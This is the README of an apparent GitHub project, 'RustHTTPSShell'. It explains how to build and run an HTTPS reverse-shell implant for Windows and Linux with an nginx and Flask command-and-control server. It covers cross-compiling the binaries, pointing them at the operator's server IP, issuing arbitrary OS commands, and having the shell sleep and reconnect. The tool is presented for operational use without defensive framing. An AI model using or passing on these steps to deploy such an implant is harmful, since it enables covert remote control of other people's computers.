# RustHTTPSShell

Tested docker build in kali.

Requirements and preperation:
------------------
1. NGINX on the host: https://nginx.org/en/linux_packages.html 
2. python3 and venv on the host: https://virtualenv.pypa.io/en/latest/installation.html 
3. Back up the existing nginx.conf file.
4. Move the nginx.conf file from this repo into /etc/nginx/nginx.conf.
5. Create a key and certificate:
It's generally recommended to avoid self-signed certificates. Only do this for using in a test environment.
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:4096 -nodes -sha256
```
6. Place the pem file in /etc/nginx/cert/server.pem.
7. Create a virtual environment for the C2 server:
```
mkdir controlServer
mv app.py controlServer/
python3 -m venv controlServer
cd controlServer
source bin/activate
pip3 install colorama flask
flask run
```

Setup:
----
1. Run docker build in directory with Dockerfile:
```
docker build .
```
2. Run container (use -v flag to mount directories as desired):
```
docker run -di [imageID]
```
3. Enter container:
```
docker exec -ti [containerID] /bin/bash
```
4. From within container, Clone repo:
```
git clone https://github.com/Business1sg00d/RustHTTPSShell.git /opt/RustHTTPSShell
cd /opt/RustHTTPSShell
```
5. From within container, add windows support:
```
rustup target add x86_64-pc-windows-gnu
```
6. If you want to change the sleep time in seconds, go into the .rs files and change the following parameters:
```
alarmClock::standBy(int)
```
Replace the "int" with whatever time you want. This will tell the shell to sleep for those seconds. Command explanation further below.

Building from within container:
-----
When building for windows use:
```
cargo build --target x86_64-pc-windows-gnu --bin main_windows
```

For linux use:
```
cargo build
```

Binaries are in "target" directory from within project directory

Usage:
--
For both Windows and Linux version:
```
.\binary.exe [Your_Server_IP] [Your_Server_port}
./binary [Your_Server_IP] [Your_Server_port}
```

You should see a prompt in the flask server terminal. It expects the following options:
```
"Enter initialization option: "

Enter "1" to begin typing arbitrary OS commands such as "dir" or "powershell Get-Service".
Enter "2" to end the session and tell the shell to "sleep". After the time expires, the shell will attempt to reconnect to your server.
```

When entering "1" to get the command, you should see the following:
```
Enter command: 
```

You can also enter "2" in this "Enter command: " state that will sleep like explained above.
